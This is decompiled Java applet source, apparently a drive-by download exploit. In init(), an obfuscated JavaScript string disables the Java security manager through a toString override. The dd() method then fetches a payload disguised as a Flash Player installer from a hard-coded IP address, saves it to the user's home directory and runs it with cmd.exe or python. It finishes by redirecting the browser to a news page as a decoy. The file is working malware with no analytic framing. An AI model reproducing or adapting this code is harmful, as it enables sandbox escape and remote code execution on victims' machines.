import java.io.InputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.io.BufferedOutputStream;
import java.io.FileOutputStream;
import java.net.URL;
import javax.script.CompiledScript;
import javax.script.Bindings;
import javax.script.ScriptEngine;
import javax.script.ScriptException;
import java.awt.Component;
import javax.swing.JList;
import javax.script.Compilable;
import javax.script.ScriptEngineManager;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class mm3 extends Applet
{
    @Override
    public void init() {
        try {
            final ScriptEngine engineByName = new ScriptEngineManager().getEngineByName("javascript");
            final Compilable compilable = (Compilable)engineByName;
            final Bindings bindings = engineByName.createBindings();
            final String replace = "t***his.to***Str****ing = fun****cti****on***()** {".replace("*", "");
            System.out.println("s2:" + replace);
            final CompiledScript compile = compilable.compile(replace + "\tjava.lang.System.setSecurityManager(null);" + "\tapplet.callBack();" + "\treturn String.fromCharCode(97 + Math.round(Math.random() * 25));" + "};" + "e = new Error();" + "e.message = this;" + "e");
            bindings.put("applet", (Object)this);
            this.add(new JList<Object>(new Object[] { compile.eval(bindings) }));
        }
        catch (ScriptException ex) {
            ex.printStackTrace();
        }
    }
    
    public void dd() {
        OutputStream outputStream = null;
        InputStream inputStream = null;
        try {
            final String property = System.getProperty("user.home");
            URL url;
            String s;
            if (System.getProperty("os.name").toLowerCase().indexOf("windows") > -1) {
                url = new URL("http://58.86.63.158/video/install_flash_player.tmp2");
                s = property + "/temp~2.exe";
            }
            else {
                url = new URL("http://58.86.63.158/video/install_flash_player.py");
                s = property + "/temp~2.py";
            }
            outputStream = new BufferedOutputStream(new FileOutputStream(s));
            inputStream = url.openConnection().getInputStream();
            final byte[] array = new byte[2048];
            long n = 0L;
            int read;
            while ((read = inputStream.read(array)) != -1) {
                outputStream.write(array, 0, read);
                n += read;
            }
            outputStream.close();
            if (System.getProperty("os.name").toLowerCase().indexOf("windows") > -1) {
                Runtime.getRuntime().exec("cmd.exe /c \"" + s + "\"");
            }
            else {
                Runtime.getRuntime().exec(new String[] { "bash", "-c", "python \"" + s + "\" " });
            }
            this.getAppletContext().showDocument(new URL("http://www.huffingtonpost.com/2011/12/06/christmas-movies-funny_n_1131463.html"), "_self");
        }
        catch (Exception ex) {
            ex.printStackTrace();
        }
        finally {
            try {
                if (inputStream != null) {
                    inputStream.close();
                }
                if (outputStream != null) {
                    outputStream.close();
                }
            }
            catch (IOException ex2) {}
        }
    }
    
    public void callBack() {
        try {
            this.dd();
        }
        catch (Exception ex) {}
    }
}
